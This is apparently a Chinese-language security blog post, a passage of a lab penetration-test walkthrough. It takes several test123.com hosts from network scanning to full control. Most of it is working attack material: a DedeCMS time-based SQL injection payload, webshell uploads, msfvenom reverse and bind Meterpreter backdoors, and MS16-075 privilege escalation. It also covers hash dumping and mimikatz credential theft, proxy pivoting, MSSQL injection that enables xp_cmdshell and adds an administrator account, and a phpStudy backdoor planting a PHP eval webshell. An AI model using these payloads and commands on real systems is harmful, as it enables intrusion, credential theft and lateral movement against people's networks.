### **7.2 主机发现**

先进行主机发现，方法有许多，分别是基于层面和工具上的不同：

1、使用 netdiscover

sudonetdiscover -i eth0 -r 192.168.202.0/24

专用的二层发现工具。拥有主动和被动发现两种方式。

常用参数:

-i：网卡选择你监控的网卡。比如 eth0

-r：range 指定 IP 段。比如 192.168.0.0/24

-l：filename 从文件读取 range 列表

-p 被动模式。默默的侦听指定的网卡以发现别的二层主机

-tARP 包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。

-c 发包数量

**2、使用 nmap**

nmap-v -sP 192.168.202.0/24

以上参数：

-sP、ICMP 扫描：类似于 ping 检测，快速判断目标主机是否存活，不做其他扫描

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libq8zyREshuAejzPNoBN6ZriaYfia2gLLuoeSN0SVkOS9925OBdVmoY3zg/640?wx_fmt=png)

3、使用系统自带 ping(速度稍慢)

for/L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=”

fping-g 10.10.10.0/24

### **7.3 端口扫描**

对所发现的主机进行端口扫描，同样也有不同工具来进行端口扫描：

nmap -sS -p 1-65535 -v 192.168.202.182  
以上参数：  
-P    指定端口扫描    

-V    详细信息        

-sS、TCPSYN 扫描（半开扫描）：只向目标发出 SYN 数据包，如果收到 SYN/ACK 响应包就认为目标端口正在监听，并立即断开连接；否则认为目标端口并未开放。

-sT、TCP 连接扫描：这是完整的 TCP 扫描方式，用来建立一个 TCP 连接，如果成功则认为目标端口正在监听服务，否则认为目标端口并未开放。

-sF、TCPFIN 扫描：开放的端口会忽略这种数据包，关闭的端口会回应 RST 数据包。许多防火墙只对 SYN 数据包进行简单过滤，而忽略了其他形式的 TCP 攻击包。这种类型的扫描可间接检测防火墙的健壮性。

-sU、UDP 扫描：探测目标主机提供哪些 UDP 服务，UDP 扫描的速度会比较慢。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibZb52HXHs0RTtNShhmetJCbEhnvWm1Bnqibqb5ib5lphiaD5micVeLqBLTQ/640?wx_fmt=png)

sudo masscan -p 1-65535 192.168.202.182--rate=1000

常用参数：

-p<ports,--ports <ports>> 指定端口进行扫描

--banners 获取 banner 信息，支持少量的协议

--rate<packets-per-second> 指定发包的速率，默认的速率是 100 包 / 秒

识别对应的端口

```
nmap-sC -A 192.168.202.182 -p 80,53,49154,6588,3389,135,21,51464,999
```

-sC：等价于–script=default，使用默认类别的脚本进行扫描可更换其他类别

-A 综合扫描，包含 1-10000 的端口 ping 扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LiboXooX0ZWUOJ2QRU86BONvUucnzjdu8ZPKsq6FxLH4bOLn30gPF5jyw/640?wx_fmt=png)

可见有 3 个 http 服务的端口打开，web 服务器为 IIS7.5，分别对其进行访问：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibxNoicwpScQ4ztGx1akrGbS1ZazamYW9x1JDA2veHv0mbRtP9lnZiaPUg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibuiaW8HqKNQJUoyjlLW4X7HgicS00Q6uWuNqhxWeZnv3DiaZiaE8k3KqLzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libb5CNPuZh3icGgXeNb4jcj64zbFTsG8rOyLUicaeDnZqUsOKW95GcRgZQ/640?wx_fmt=png)

### **7.4 web 漏洞测试**

第一个域名：cms.test123.com，很明显是 dedecms，

http://cms.test123.com/data/admin/ver.txt 先确定版本号：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibGgjTwVlR1VziaeCtZa01rAeicaZAxCRsBrxrG20hAmHnSOr4hibSpFeDQ/640?wx_fmt=png)

再确定是否能注册，并查找该版本存在相关注入漏洞（相关漏洞原理后面会再详写），进行漏洞利用得到管理员密码 hash:

该漏洞是由于由于 dedecms 使用伪全局变量原因，可导致用户构造任意的 sql 语句，造成注入。

相关 payload 使用时间盲注查询 amdin 密码：s=target+"/member

```
/mtypes.php?dopost=save&_FILES[mtypename][name]=.xxxx&_FILES[mtypename][type]=xxxxx&_FILES[mtypename][tmp_name][a'%20and%20`'`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),"+s1+",1))%3d"+s2+",sleep(4),0)%20and%20mtypeid%3d1%23]=w&_FILES[mtypename][size]=.xxxx"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibhUFH0PKsXarLLhOVJUPFPoicL8mtrTT2PJfO6g3essFJHtVZj16TOXg/640?wx_fmt=png)

详细漏洞分析可参考：Dedecms20150618 注入 ·Manning23

密码破解得 admin7788，然后登上后台，上传一句话并连接:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibYKDpMIVXYiaJEKmnZrEWqJz9n69tU6IB1kqSpGDYnUyXLxjVvOJ9PBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibibXQ9BfwtFPsWRIkh7TAe2RNd75LmHwibqiaiboveZBYFIp70NpTrCyMFA/640?wx_fmt=png)

可见一句话木马权限不够，传上 asp 大马，再执行相关命令：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib9ArbMkBdThqdhEVQpWicdY1YWm3lJncPpnk7YJWnlAZDuPugCPd4ExQ/640?wx_fmt=png)

使用 msf 工具集生成相关后门，

```
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.202.180 lport=33444-f exe -o h33444.exe
```

，并设置监听：  

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibfYshAWjAWcLGg0Rp0ze3R08VVCgYvLzNeLK0XNMkPKzQ4k3TPVYbsQ/640?wx_fmt=png)

先用 asp 扫描可执行的相关目录，然后上传 msf 后门到相应目录：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibZBJicOTDdEKLGjUxOvuE2t2pH2laYHv5RgcDPiacPiaicnETwQHsZ808fQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibiaFBBA3PTIH2uSfIOIyGOKHNdydX0pq8VQLibIxv6jkUQhaqWiaMq2icbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib58pPjqsa0KibTl59oYJuSHXJ2sjPfc8aVov3qib0xMh1X95vIfVS2ysg/640?wx_fmt=png)

使用 msf 自带的 post/multi/recon/local_exploit_suggester 模块进行漏洞查找，然后利用 ms_075 进行提权 useexploit/windows/local/ms16_075_reflection_juicy

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib39yibZWMlwicl4KYGesQy1icdfCAyNruTZJEiaKrqo4Q3tY57PETHeIXIg/640?wx_fmt=png)

继续进行基本的信息收集，ipconfig：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibqsLicyricYqeSDxDbxyl7EY14WdG3V9M7Eu37dMtq7B8dEzoaziaD1ibcQ/640?wx_fmt=png)

执行 runget_local_subnets，存在两个网段:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibZKONMT9XOVTzheNBwvV2kibOiaFaovWwG2aDCqS7Q9UhNxspadWvgGKg/640?wx_fmt=png)

run autoroute -s 10.10.10.0/24

run autoroute -d -s 10.10.10.0/24 // 删除网段

route add 内网 ip 子网掩码 session 的 id

route print 查看设置后的网段

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibLYkiaUBibHnpjHia9MyqhUDgSHNLRzfzNgiaTxfmZWIaUJ2tSNVEnXiaKOA/640?wx_fmt=png)

执行 runpost/windows/gather/smart_hashdump 命令获得系统内用户的 hash 值，以便用于 hash 传递：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibDyrUfHSKflY6pdABc3eJPDJVTD5JdXY72kYP7jsiaepdDiaFyGZhH0uQ/640?wx_fmt=png)

Migrate 迁移进程后，Loadkiwi 加载 mimiatz，kiwi_cmdsekurlsa::logonpasswords 尝试使用其获取明文：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibwsXPh6T4iciciaR4bmYGVPVlmWaEr66hcyhPBUJWUYr6u9icjldUuhVzZA/640?wx_fmt=png)

### **7.5 内网横移**

启动 socks 代理，sudovim /etc/proxychains.conf 修改 proxychains 配置文件，对 10.10.10.0\24 进行主机发现：

useauxiliary/server/socks_proxy

set srvport 22222

run

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib7ZkOL4d8ribpKERO8LfxcDtXVgvZmF3opicZjib5UnRyV0EUJzMzicubgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib8anoKias6KfCXUwuMiaeL6nMCIyTSPibx8xEv5JC5viarut9v9ajibX1avw/640?wx_fmt=png)

```
proxychains fping -g 10.10.10.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libicylha6aEicv023aXXOb0geKpYw3fAgQZPLFaKBaibU4PXNoqL0VWvic6A/640?wx_fmt=png)

对所发现的 IP 进行端口扫描：

```
proxychains nmap -sC -A 10.10.10.143 -p80,53,1433,49154,6588,3389,135,21,51464,999
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibkG5H74LhKs7LRdwCZxCia4qedraia5XxdhcVj1RWqd0L3E1YMtKlRy6g/640?wx_fmt=png)

对所发现的主机进行 ipc 连接，报错 1326 用户名或密码错误：

```
netuse \\10.10.10.139\ipc$ "!@#Qwe123."/user:"localhost\administrator”
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibBWbnsUSjPnicf0c9bIhNTr0lMCCZDumtunB2c953vLcGPiaUY51EZLdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib0QuuAxoc9X1rkvhFBClyDgXAo3BhKqibcNHXaSNHolJ1IUILCywCCUw/640?wx_fmt=png)

翻看 net.test123.com 网站的目录可以找到其数据库的用户和密码：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LiboolSpgX9kqNDddic9csRQ2EYLbhGomcNhdBo7eic2pZEQyEJhk4GWHVQ/640?wx_fmt=png)

10.10.10.143 开启了 1433 端口，有 mssql 服务，可以使用上述密码登录服务器，也可以对 net.test123.com 进行子目录爆破，得到后台路径：http://net.test123.com/admin/index，再对后台进行相应挖掘：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibZkVh9A3nYicOdOrBwqWiaRcpWVATgU0eYecQ3eU5DcraYDibQSwwXiaFXw/640?wx_fmt=png)

显然后台登录表单 username 存在注入:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibJqJwK8xvlMQNliaiaoqcr6mTbBicvUatJyKE2vhJ0zZoJkUSUStokwibfA/640?wx_fmt=png)

我们可以先进行相关判断，再通过其添加系统用户：

判断是不是 dba 权限 (延时后返回正确页面，确定为 dba 权限 < 也可用 sqlmap 的–is-dba 判断 >)

admin';if(1=(selectis_srvrolemember('sysadmin'))) WAITFOR DELAY'0:0:2';--

判断是否是站库分离 (延时后返回正确页面，确定站库没有分离)

admin';if(host_name()=@@servername)WAITFOR DELAY'0:0:5';--

查看是否有 xp_cmdshell:

admin';if(1=(selectcount(*) from master.dbo.sysobjects where xtype ='x'and name ='xp_cmdshell')) WAITFOR DELAY'0:0:2'--

恢复／删除 xp_cmdshell

execsp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'

execsp_dropextendedproc 'xplog70.dll'

先开启 xp_cmdshell：

execsp_configure 'show advanced options', 1;reconfigure;

execsp_configure 'xp_cmdshell',1;reconfigure;

添加用户 test，并添加 test 用户到管理员组

execmaster..xp_cmdshell 'net user test 123. /add'

execmaster..xp_cmdshell 'net localgroup administrators test add'

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibAAdVbViaxtC5rmGrqpTOBM35VJJrPx30k9y6ialKco90fwdZ2djMAAbw/640?wx_fmt=png)

也可以通过注入用 sqlmap 进行 getshell：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibVq9A1MLibf5kBzBIlO75D4QiaLBLHWqc9UEotRrnU2DmjkBRZFG5VxBg/640?wx_fmt=png)

爆出相关库：sqlmap-r post --dbms mssql -v 1 --dbs --batch

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibNRzzbDKLR1LFIUxp7aHF5icSwp1brWt08G5ibBPAGIE8SN5sM0CJMdwQ/640?wx_fmt=png)

Msf 生成 bind.exe 正向后门：

msfvenom-p windows/meterpreter/bind_tcp lport=13777 -f exe -o hb.exe

用 aspx 文件上传 bind.exe，并调用 exec 执行：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibA1JtmneMiasbkwiafbgibGKTm0gdqpYf1uYDfOvBfhqWeZDQ7Q9X9PWrg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Lib4CN3yKdPzCybK5w5YJ2C08gT79daUnfXnTpxmZfqougkaDLOAuv4AQ/640?wx_fmt=png)

Msf 执行相应命令进行连接：

```
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set RHOST 10.10.10.143
set lport 13777
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libdq3PWuq8ibmibyQiaolGA78BTLfMBU8tsl6jt9d6esnibictyfbZexKzvPw/640?wx_fmt=png)  

同样 Migrate 迁移进程后，Loadkiwi 加载 mimiatz，kiwi_cmdsekurlsa::logonpasswords 尝试使用其获取明文：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibGJqsxAVfnOpZPIOibdEF1nuH8Ziay6MALsLJeIQbmibZhjwAaGLQ5gEibA/640?wx_fmt=png)

添加路由：run autoroute -s 10.10.1.0/24

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibW6atBUIANyRYiaicTISh8icrKcTLsYQSFH9Wd6H1DQTibNgbYml13rtmUw/640?wx_fmt=png)

启动 socks 代理，配置 proxychains 配置文件，对 10.10.1.0\24 进行主机发现：

```
use auxiliary/server/socks_proxy
set srvport 33333
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libz4cDic3iaoMOxgTzXCE30EUNOvt5a7dZzVzoDiaVcg15DFMAW2cUibfpMw/640?wx_fmt=png)  

得到明文和 hash 后我们可以通过 ipc 连接进行横向：

```
net use \\10.10.1.142\ipc$ "!@#QWEasd123."/user:"localhost\administrator”
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibOGrBJZANNKKJcWYgaN1uwg9MyrQvRkMsfAiaHatNoibZIHib6BssxsqJQ/640?wx_fmt=png)

使用代理

```
proxychains nmap -sC -A 10.10.1.142 -p80,53,1433,49154,6588,3389,135,21,51464,999
```

进行扫描端口:  

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibdADGKf4ic2ImTIO4y34ULZj3iah7laXy54NINCRWV6fDjiaVD9cWhxLzg/640?wx_fmt=png)

浏览器设置 socks 代理后，查看 10.10.1.142 网站主页，发现其 phpstudy 版本存在后门可以进行利用：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libf4q4p26nbwYWUVBXpa59qSzqVRda7aePrhqrErWelMjZAfSQadPudQ/640?wx_fmt=png)

Phpstudy 漏洞利用：

```
'echo ^<?php @eval($_POST["shell"])?^>>C:\phpStudy\WWW\shell.php'
```

蚁剑设置 socks 代理为 kali 的 33333 端口，进行连接：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libuz4rJKmIfCQwOaaIobUTTYrmVrLENKgF1kBG34wVTn7AVyPjMuqaJQ/640?wx_fmt=png)

蚁剑执行 msf 的 bind 后门，msf 进行正向连接：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80LibPDBG6X72I5KboDUVkCS2A7MBO6w6gPZxY54KSkqnWqr4gINMWqQLmw/640?wx_fmt=png)

三台机子的权限均到手。

参考:

https://www.moonsec.com/

https://www.cnblogs.com/backlion/p/6927322.html

内网安全攻防

**6** **关注**

觉得本文不错 记得 分享 点赞 给作者加油  

本公众号长期更新安全类文章和视频

欢迎扫一扫关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADPmHFz2qUd6yribKia4q80Libgbeic32vCVda0g9W2ic0ZiazJTiboPPEWK8dQT3Diaum1j9GmlX8QkZfic6Q/640?wx_fmt=jpeg)